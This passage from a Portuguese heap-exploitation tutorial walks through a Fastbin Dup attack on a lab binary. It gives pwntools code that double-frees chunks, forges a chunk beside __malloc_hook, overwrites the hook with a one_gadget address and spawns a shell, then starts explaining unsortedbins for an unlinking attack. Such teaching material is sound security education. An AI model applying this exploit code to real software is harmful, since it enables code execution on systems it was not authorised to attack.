
<span class="c1"># criando um chunk fake que aponta para o "free_hook()"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mi">16</span><span class="p">))</span>

<span class="c1"># requisitando o chunk B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># requisitando o chunk A com "fd" para "free_hook()"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo "free_hook()"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora podemos executar o script atrelado ao GDB.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_126.png" alt="Erro na execução" /></p>

<p>Aparentemente algo deu errado e recebemos a chamada para a função <code class="language-plaintext highlighter-rouge">abort()</code> na execução.<br />
Alterando para o frame <code class="language-plaintext highlighter-rouge">_int_malloc()</code> e visualizando o código, podemos verificar o mesmo erro que já vimos na situação passada.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_127.png" alt="Código que aciona o erro" /></p>

<p>É o mesmo erro que ocorre quando o <em>size field</em> do <em>chunk</em> falso tenta ser alocado em uma <em>fastbin</em> de outeo tamanho.<br />
Quando utilizamos o comando <code class="language-plaintext highlighter-rouge">dq</code> fica claro o motivo, o <em>chunk</em> falso se encontra ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_128.png" alt="Chunk falso" /></p>

<p>E seu <em>size field</em> se encontra ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_129.png" alt="Size field do chunk falso" /></p>

<p>Assim como na exploração anterior, nos deparamos com um <em>size field</em> nulo, porém, desta vez, não temos o controle para alterá-lo. E além disso, não existe nenhum campo que possa ser usado ao redor desta posição, que possa ser utilizado como <em>size field</em>.<br />
Portanto, aparentemente, a <code class="language-plaintext highlighter-rouge">free_hook()</code> não é uma boa opção para utilizarmos. Podemos voltar para a alternativa da exploração anterior, onde utilizamos a <code class="language-plaintext highlighter-rouge">malloc hook</code>.</p>

<p>Inspecionando a memória ao redor da <code class="language-plaintext highlighter-rouge">malloc hook</code> podemos ver sua posição, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_130.png" alt="Posiçào da malloc hook" /></p>

<p>E ao observar a resposta, podemos ver que existem alguns endereços ao redor, mas nenhum deles aparenta ser um <em>size field</em> válido, pois todos estes valores são muito altos.<br />
Porém, o PWNDBG nos permite procurar por <em>chunks</em> que se qualificam para os <em>fastbins</em>. O comando <code class="language-plaintext highlighter-rouge">find_fake_fast</code> nos permite fazer esta procura.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_131.png" alt="Encontrando um possível chunk falso" /></p>

<p>Aparentemente encontramos um candidato a <em>chunk</em> falso no endereço <code class="language-plaintext highlighter-rouge">0x7ffff7dd0b2d</code>, podemos calcular a distância entre a <code class="language-plaintext highlighter-rouge">malloc hook</code> e o candidato a <em>chunk</em> falso com o comando <code class="language-plaintext highlighter-rouge">distance</code>, conforme mostrado na imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_132.png" alt="Distância entre o endereços" /></p>

<p>Conforme podemos observar, o candidato a <em>chunk</em> falso está <code class="language-plaintext highlighter-rouge">0x23</code> bytes (35 bytes) antes da <code class="language-plaintext highlighter-rouge">malloc hook</code><br />
Podemos visualizar melhor como o PWNDBG chegou a este resultado, utilizando o comando <code class="language-plaintext highlighter-rouge">dq</code> para visualizar o <em>dump</em> deste endereço, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_133.png" alt="Dump do chunk falso" /></p>

<p>Aparentemente o PWNDBG forçou um <em>size field</em> de tamanho <code class="language-plaintext highlighter-rouge">0x7f</code> desalinhando um dos endereços de memória existentes antes da <code class="language-plaintext highlighter-rouge">malloc hook</code>. Este <em>size field</em> é composto dos três bytes mais significantes do <em>quadword</em> mostrado abaixo e os cinco bytes menos significantes do quadword seguinte, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_134.png" alt="Dump do chunk falso" /></p>

<blockquote>
  <p>O GDB nos mostra os bytes em <em>little endian</em>, o que significa que são mostrados na ordem reversa.</p>
</blockquote>

<p>Utilizando o comando <code class="language-plaintext highlighter-rouge">dump bytes</code> ou simplesmente <code class="language-plaintext highlighter-rouge">db</code>, o GDB nos mostra o mapa da memória, que pode nos ajudar a visualizar o endereço, mostrando o <code class="language-plaintext highlighter-rouge">0x7f</code> seguido de bytes nulos, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_135.png" alt="Mapa da memória" /></p>

<p>Olhando pela perspectiva da malloc, podemos utilizar este endereço, pois ela não checa o alinhamento do endereço, nem checa se as <em>flags</em> do chunk são válidas. Algumas combinações de <em>flags</em> podem causar um <em>crash</em>, porém, o <code class="language-plaintext highlighter-rouge">0f</code> funciona perfeitamente (<em>flags</em> são descritas nas seções anteriores).</p>

<p>Porém, existe um conhecimento importante nesta situação, em condições de produção este binário será submetido ao ASLR, o que significa que os endereços serão randômicos em toda a execução do programa.<br />
No entanto, na arquitetura <strong>x86</strong> da maioria das plataformas Linux, as bibliotecas sempre são mapeadas com endereços iniciados em <code class="language-plaintext highlighter-rouge">0x00007f</code>. E o endereço que estamos utilizando, que se inicia com o byte <code class="language-plaintext highlighter-rouge">0x7f</code>, faz parte da funcionalidade padrão <code class="language-plaintext highlighter-rouge">I/O</code>. Podemos confirmar com o comando <code class="language-plaintext highlighter-rouge">print</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_136.png" alt="Mapa da memória" /></p>

<p>Além disso, o <em>quadword</em> sequinte composto de zeros, é um <em>qwadword</em> de alinhamento que necessariamente será sempre nulo. Portanto, mesmo em condições de produção, sempre será possível obter este <em>size field</em> seguido de bytes nulos.</p>

<p>Com este conhecimento, podemos modificar nosso script. A primeira coisa que é preciso editar, é o alinhamento do <em>chunk</em> falso com o <em>size field</em> <code class="language-plaintext highlighter-rouge">0x7f</code> substituindo o endereço da <code class="language-plaintext highlighter-rouge">free_hook()</code> pela <code class="language-plaintext highlighter-rouge">malloc hook</code> e subtraindo 35 bytes, pois esta é a distância entre ela e o endereço do <em>chunk</em> falso.<br />
Depois, podemos substituir todas as requisições de <em>chunks</em> de <code class="language-plaintext highlighter-rouge">0x30</code> bytes, para <em>chunks</em> de <code class="language-plaintext highlighter-rouge">0x70</code> bytes, isso para que nosso <em>size field</em> possa ser comparado com a <em>fastbin</em>, sem que haja nenhum erro durante a checagem.<br />
Por ultimo, precisamos adicionar 19 bytes de “lixo” no início dos dados que vamos escrever no <em>chunk</em> falso, porque o primeiro <em>quadword</em> do <em>user data</em> não estará mais alinhado com a <code class="language-plaintext highlighter-rouge">malloc hook</code>.</p>

<p>O bloco de exploração ficou desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para o "malloc hook"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">lib</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mi">35</span><span class="p">))</span>

<span class="c1"># requisitando o chunk B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># requisitando o chunk A com "fd" para "malloc hook"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo "malloc hook"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">19</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Após esta alteração, podemos executar o script com as opções do GDB.<br />
A primeira coisa a se observer, é que desta vez o GDB não abortou a execução. Se pausarmos o GDB e fizermos o <em>disassembly</em> da <code class="language-plaintext highlighter-rouge">malloc hook</code> com o comando <code class="language-plaintext highlighter-rouge">u</code>, podemos ver que ela agora aponta para a função <code class="language-plaintext highlighter-rouge">system()</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_137.png" alt="Malloc hook apontando para system()" /></p>

<p>Em vias normais, o que é preciso fazer agora, é chamar a função <code class="language-plaintext highlighter-rouge">malloc()</code> novamente, com o endereço da <em>string</em> que contém o comando a ser executado como primeiro argumento, assim como fizemos na técnica <code class="language-plaintext highlighter-rouge">The house of Force</code>.</p>

<p>No entando, se continuarmos a execução e tentarmos inserir um endereço que seja maior que 120 bytes, o que não é nem próximo de um endereço válido dentro do binário, o programa não nos deixa completar a requisição, conforme ilustradao abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_138.png" alt="Programa bloqueia endereços altos" /></p>

<p>Neste ponto, já foi possível redirecionar o fluxo do programa uma vez e pelo menos metade da exploração está concluída, restando somente redirecionar o fluxo mais uma vez. No entanto, o próprio programa bloqueia a continuidade devido a limitação do <em>size field</em>.</p>

<p>Porém, existe uma forma de conseguir um <code class="language-plaintext highlighter-rouge">shell</code> alterando o fluxo do programa apenas uma vez utilizando o <code class="language-plaintext highlighter-rouge">one gadgets</code>.</p>

<h3 id="one-gadgets">One gadgets</h3>

<p>Se consultarmos a <em>man page</em> da função <code class="language-plaintext highlighter-rouge">system()</code>, podemos ver que ela utiliza a função <code class="language-plaintext highlighter-rouge">execl()</code> para executar o “/bin/sh” com a opção “-c” seguido pelo comando passado como argumento, que por sua vez utiliza <code class="language-plaintext highlighter-rouge">execve()</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_139.png" alt="Man page system()" /></p>

<p>Isso significa que dentro da GLIBC existe algum código equivalente ao <code class="language-plaintext highlighter-rouge">execve("/bin/bash")</code> que nos dará uma <code class="language-plaintext highlighter-rouge">shell</code>.<br />
E estes trechos de código que encapsulam funções, são chamados de <code class="language-plaintext highlighter-rouge">one gadgets</code>.</p>

<p>Podemos procurar por <em>gadgets</em> manualmente, porém a ferramenta “onde_gadget” (encontrada em <a href="https://github.com/david942j/one_gadget">github.com/david942j/one_gadget</a>), nos permite fazer a busca automatizada.</p>

<blockquote>
  <p>A sintaxe é <code class="language-plaintext highlighter-rouge">one_gadget &lt;caminho para a GLIBC do binário&gt;</code></p>
</blockquote>

<p>Normalmente o caminho para a GLIBC é constante nos binários do sistema, porém como este binário foi compilado com uma versão específica da GLIBC, precisamos inserir seu <em>path</em> no comando, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_140.png" alt="one_gadget" /></p>

<p>Conforme podemos observar o one_gadget nos mostra o <em>offset</em> (distância entre o endereço inicial da GLIBC até o endereço da chamada) de cada chamada, seguido das <em>constraints</em>, ou condições que precisam ser atendidas para a chamada ser válida.</p>

<p>Por exemplo: o terceiro gadget, se inicia <code class="language-plaintext highlighter-rouge">0xe1fa1</code> bytes depois do endereço inicial da GLIBC e a condição para que a chamada seja válida, é de que o RSP (<em>Stack pointer</em>) + <code class="language-plaintext highlighter-rouge">0x50</code> esteja nulo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_141.png" alt="Condições do gadget" /></p>

<p>Isto corre, pois neste <em>gadget</em> em particular, a <em>array</em> de argumendos da chamada para <code class="language-plaintext highlighter-rouge">execve()</code> se inicia na <em>stack pointer</em> + <code class="language-plaintext highlighter-rouge">0x50</code>.</p>

<p>Na maioria dos sistemas o “/bin/sh” é um link simbólico para o <code class="language-plaintext highlighter-rouge">dash</code>. Podemos confirmar, consultando <code class="language-plaintext highlighter-rouge">man sh</code>, que nos abrirá o manual do dash.</p>

<blockquote>
  <p>O <em>dash</em> é muito sensível a argumentos mal formados, incluindo endereços ilegíveis, opções inexistentes e <em>paths</em> inexistentes e falhará se for chamado com qualquer uma destas inconsistências.<br />
E é por isso que é preciso se certificar que a primeira entrada na <em>array</em> de argumentos seja nula, pois isso garante que ele não tente processar qualquer argumento falho em potencial.</p>
</blockquote>

<p>Vamos verificar se conseguimos atender alguma das condições mostradas pelo one_gadget no momento em que fazemos a chamada. Para isso, vamos executar o script novamente com as opções do GDB, pausar a execução e inserir um <em>breakpoint</em> em <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_142.png" alt="Breakpoint na __malloc_hook" /></p>

<p>Agora podemos continuar o programa, alterar para o terminal de execução do script e requisitar um <em>chunk</em> válido com os tamanhos entre 1 e 120 bytes.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_143.png" alt="Solicitando um chunk válido" /></p>

<p>Voltando ao GDB, vemos que ele parou em nosso <em>brakpoint</em>, utilizando o comando <code class="language-plaintext highlighter-rouge">context reg</code>, podemos focalizar os registradores no exato momento em que chamamos a <code class="language-plaintext highlighter-rouge">malloc()</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_144.png" alt="Registradores no breakpoint" /></p>

<p>Analisando os registradores e comparando com as condições que o one_gadget nescessita, podemos ver que a primeira condição que dizia que os registradores <code class="language-plaintext highlighter-rouge">R12</code> e <code class="language-plaintext highlighter-rouge">R13</code> precisariam estar nulos, não é atendida, pois neste ponto eles estão em uso.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_145.png" alt="Registradores em uso" /></p>

<p>A segunda opção, nos dizia que os registradores <code class="language-plaintext highlighter-rouge">RBP - 0x40</code> e <code class="language-plaintext highlighter-rouge">R12</code> precisam estar nulos. O que também não é atendido, pois neste ponto, o <code class="language-plaintext highlighter-rouge">R12</code> está em uso.</p>

<p>Já a terceira opção, nos dizia que o registrador <code class="language-plaintext highlighter-rouge">RSP + 0x50</code>, deve estar nulo. Podemos checar a <em>stack</em> com o comando <code class="language-plaintext highlighter-rouge">stack</code> seguido da quantidade de <em>quadwords</em> que queremos mostrar, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_146.png" alt="Consultando a stack" /></p>

<p>Como podemos ver, este endereço também não é nulo, porém é um endereço válido.<br />
De acordo com a <em>C11 standard states</em> (que pode ser consultada em <a href="https://port70.net/~nsz/c/c11/n1570.html">port70.net/~nsz/c/c11/n1570.html</a>), a primeira entrada em toda <em>argv array</em>, normalmente representa o nome do programa sendo invocado, e que na maior parte dos casos, é ignorada.</p>

<p>Já a próxima entrada, é nula, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_147.png" alt="Próxima entrada nula" /></p>

<p>E uma vez que a chamada principal será ignorada e partirá para a próxima, as condições do one_gadget serão atendidas, mesmo que o próprio one_gadget tenha mostrado o endereço anterior.</p>

<p>Para testarmos esta teoria, vamos editar o bloco de exploração do script e substituir o endereço da função <code class="language-plaintext highlighter-rouge">system()</code> pelo endereço da GLIBC mais o <em>offset</em> do terceiro gadget sugerido pelo one_gadget, e adicionar mais uma chamada de malloc para ativarmos o gadget.</p>

<p>O bloco fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># enviando o username
</span><span class="n">username</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"username: "</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># requisitando 2 chunks de 0x30 bytes
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x68</span><span class="p">)</span>

<span class="c1"># liberando os chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># criando um chunk fake que aponta para o "malloc hook"
</span><span class="n">dup</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__malloc_hook</span> <span class="o">-</span> <span class="mi">35</span><span class="p">))</span>

<span class="c1"># requisitando o chunk B
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># requisitando o chunk A com "fd" para "malloc hook"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="p">)</span>

<span class="c1"># sobrescrevendo "malloc hook"
</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">19</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xe1fa1</span><span class="p">))</span>

<span class="c1"># ativando o gadget
</span><span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s">""</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora podemos executar o script, em condições de produção, sem atrelá-lo ao GDB.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_148.png" alt="Shell obtido" /></p>

<p>E como podemos observer, conseguimos invocar um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<blockquote>
  <p>Em resumo, abusamos da vulnerabilidade de <em>double free</em> para invocarmos a técnica <code class="language-plaintext highlighter-rouge">Fastbin Dup</code>, do qual utilizamos para fazer um link com um <em>chunk</em> falso sobrescrevendo a <code class="language-plaintext highlighter-rouge">malloc hook</code> na <em>fastbin</em> de <code class="language-plaintext highlighter-rouge">0x70</code> bytes.<br />
Conseguimos alocar este <em>chunk</em> falso utilizando metadados da própria GLIBC como <em>size field</em>. E como a malloc não checa o alinhamento do endereço, muito menos as <em>flags</em>, não houve problemas em alocar este <em>chunk</em>.<br />
Então escrevemos o endereço do <em>gadget</em> que chama o <code class="language-plaintext highlighter-rouge">shell</code> sobre a <code class="language-plaintext highlighter-rouge">malloc hook</code>.<br />
E finalmente ativamos a <code class="language-plaintext highlighter-rouge">malloc()</code> que foi redirecionada via <code class="language-plaintext highlighter-rouge">malloc hook</code> para o <em>gadget</em> nos dando um <code class="language-plaintext highlighter-rouge">shell</code>.</p>
</blockquote>

<p>A <code class="language-plaintext highlighter-rouge">Fastbin Dup</code> pode ser utilizada nas GLIBCs de versão menor ou igual a <code class="language-plaintext highlighter-rouge">2.31</code>.</p>

<h1 id="unlinking-attack">Unlinking Attack</h1>

<p>Esta é provavelmente uma das técnicas mais complexas da exploração da <em>heap</em>, da qual exigirá um conhecimento um pouco mais profundo da estrutura de uma <code class="language-plaintext highlighter-rouge">arena</code>. Para tanto, antes de iniciarmos a exploração, vamos nos aprofundar nesta estrutura.</p>

<h2 id="unlinking">Unlinking</h2>

<p>Até o momento vimos apenas o que acontece com <em>chunks</em> pequenos o suficiente para se qualificar para os <em>fastbins</em> quando são liberados, ou seja, <em>chunks</em> com tamanho entre <code class="language-plaintext highlighter-rouge">0x20</code> e <code class="language-plaintext highlighter-rouge">0x80</code> bytes.</p>

<p>Porém, existem <em>bins</em> de diversos tamanhos, que são chamados de <em>unsortedbins</em>. Estes <em>chunks</em>, além da diferença no tamanho, também possuem um conceito de “consolidação” de <em>chunks</em>.</p>

<p>No diretório <code class="language-plaintext highlighter-rouge">unsafe_unlink</code>, vamos carregar no GDB o binário <code class="language-plaintext highlighter-rouge">demo</code>. Também vamos alterar o contexto do painel para o código com o comando <code class="language-plaintext highlighter-rouge">set context-sections code</code>, inserir um <em>breakpoint</em> na função <code class="language-plaintext highlighter-rouge">main()</code> com o comando <code class="language-plaintext highlighter-rouge">b main</code> e executar o programa.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_162.png" alt="Carregando o programa no GDB" /></p>

<p>Observando o código, já sabemos como as requisições para a malloc funcionam, então podemos utilizar o comando <code class="language-plaintext highlighter-rouge">next 2</code> e inspecionar a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_163.png" alt="Requisitando os chunks" /></p>

<p>Como podemos ver, temos os dois <em>chunks</em>, <em>chunk</em> a e <em>chunk</em> b, com o tamanho de <code class="language-plaintext highlighter-rouge">0x90</code> bytes cada criados na <em>heap</em>. Antes, quando liberavamos <em>chunks</em> apropriados para os <em>fastbins</em>, eles não tinham nenhum efeito perceptível nos <em>chunks</em> ao redor, nem alteravam seu comportamento por estarem próximos ao <em>top chunk</em> quando eram liberados. Porém, estamos lidando com <em>chunks</em> que não se qualificam para os <em>fastbins</em>, por serem maiores que <code class="language-plaintext highlighter-rouge">0x80</code> bytes.</p>

<p>Vamos avançar um passo na execução, que vai liberar o <em>chunk</em> b, que além de não estar na <em>fastbin</em>, está adjacente ao <em>top chunk</em> e checar a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_164.png" alt="Liberando o chunk b" /></p>

<p>Diferente dos <em>chunks</em> pertencentes aos <em>fastbins</em>, este <em>chunk</em> desapareceu. Pois <em>chunks</em> grandes demais para se qualificarem aos <em>fastbins</em> e que se encontram adjacentes ao <em>top chunk</em>, aqui referenciados como <em>chunks</em> “normais”, são consolidados ao <em>top chunk</em>.<br />
Se tentarmos visualizar os <em>bins</em> com o comando <code class="language-plaintext highlighter-rouge">bins</code>, veremos que o <em>chunk</em> liberado não pertence a nenhuma lista.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_165.png" alt="O chunk b, não pertence a nenhuma lista" /></p>

<p>Se avançarmos mais dois passos na execução, o <em>chunk</em> b será requisitado novamente, seguido de uma requisição de <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x20</code> bytes. Porém, vamos retornar ao <em>chunk</em> b em alguns momentos, enquanto isso, vamos ver o que acontece quando liberamos um <em>chunk</em> normal que não é adjacente ao <em>top chunk</em>. Avançando mais um passo, vamos liberar o <em>chunk</em> a com o comando <code class="language-plaintext highlighter-rouge">next</code> e inspecionar a <em>heap</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_166.png" alt="Liberando o chunk a" /></p>

<p>Podemos observar que três mudanças aconteceram na <em>heap</em>. A primeira, é que o <em>bit</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do chunk seguinte foi retirado, algo que não acontece quando liberamos <em>chunks</em> qualificados para os <em>fastbins</em>, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_167.png" alt="Bit prev_inuse retirado" /></p>

<p>Em breve, veremos a importância desta informação. A segunda mudança, é que o ultimo <em>quadword</em> do <em>user data</em> do <em>chunk</em> a, foi reaproveitado como um <code class="language-plaintext highlighter-rouge">prev_size field</code>, que como podemos ver, contém seu próprio tamano, outra coisa que não acontece quando estamos lidando com <em>fastbins</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_168.png" alt="Campo prev_size adicionado" /></p>

<p>Observe como o <em>quadword</em> que contém o <code class="language-plaintext highlighter-rouge">prev_size field</code> agora tem outra cor no PWNDBG, indicando que pertence ao <em>chunk</em> b ao invés do <em>chunk</em> a, este é um exemplo claro de como os <em>chunks</em> podem mudar sua forma durante seu tempo de vida. Por ultimo, vemos que o <em>chunk</em> a, foi inserido no <em>unsortedbin</em>, podemos confirmar isto com o comando <code class="language-plaintext highlighter-rouge">unsortedbin</code> conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_169.png" alt="Chunk a inserido no unsortedbin" /></p>

<p>A <em>unsortedbin</em> é uma outra lista de <em>chunks</em> livres na malloc. Diferente dos <em>fastbins</em>, existe apenas um <em>unsortedbin</em> por arena. Ela é uma lista “duplamente ligada”, circular e que armazena <em>chunks</em> livres de <strong>qualquer</strong> tamanho.</p>

<p>Por conta de ser duplamente ligada, ela utiliza ambos os <em>forward</em> e <em>backward pointers</em>, ou “fd” e “bk” respectivamente. E podemos ver que os dois primeiros <em>quadwords</em> do <em>user data</em> do <em>chunk</em> a, foram reaproveitados como “fd” e “bk” na <em>unsortedbin</em>, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_170.png" alt="Fd e bk da unsortedbin" /></p>

<p>O topo da uma <em>unsortedbin</em> existe em uma <em>main arena</em>, assim como os <em>fastbins</em>, que um par de <em>forward</em> e <em>backward pointers</em> que a malloc trata como se fosse parte de um <em>chunk</em> falso, que se encontram dois <em>quadwords</em> depois do <em>top chunk pointer</em>. Podemos visualizá-lo na <code class="language-plaintext highlighter-rouge">main arena</code>, requisitando os 16 primeiros quadwords com o comando <code class="language-plaintext highlighter-rouge">dq</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_171.png" alt="Estrutura da main arena" /></p>

<p>Neste momento, ambos “fd” e “bk” na <code class="language-plaintext highlighter-rouge">main arena</code> apontam para o <em>chunk</em> a, que é o único <em>chunk</em> neste <em>unsortedbin</em>, circulados em vermelho. As “fd” e “bk” do <em>chunk</em> a apontam para o <em>chunk</em> do <em>unsortedbin</em>, curculados de azul que se inicia no <em>top chunk</em> circulado de verde.</p>

<p>A malloc trada o topo do <em>unsortedbin</em> como um <em>chunk</em> falso desta forma, exatamente para evitar ter que tratá-lo de forma especial.</p>

<p>A imagem abaixo exemplifica de forma abstrata a estrutura do <em>unsortedbin</em>, onde o <em>Head</em> representa o topo do <em>ubnsortedbin</em> na <code class="language-plaintext highlighter-rouge">main arena</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_172.png" alt="Representação da estrutura de um chunk" /></p>

<p>Nesta estrutura, cada “fd” forma uma lista circular com o “fd” do <em>unsortedbin</em> apontando para o primeiro <em>chunk</em> no <em>bin</em> e o “fd” deste chunk aponta para o próximo respectivamente, e a “fd” do último <em>chunk</em> aponta de volta para a “fd” do <em>unsortedbin</em>, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_173.png" alt="Direcionamento dos fds" /></p>

<p>Da mesma forma, a “bk” do último <em>chunk</em> no <em>bin</em> aponta para a “fd” do chunk anterior sucessivamente e a “bk” da <em>unsortedbin</em> aponta para o útimo <em>chunk</em>, completando um circulo, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_174.png" alt="Direcionamento dos bks" /></p>

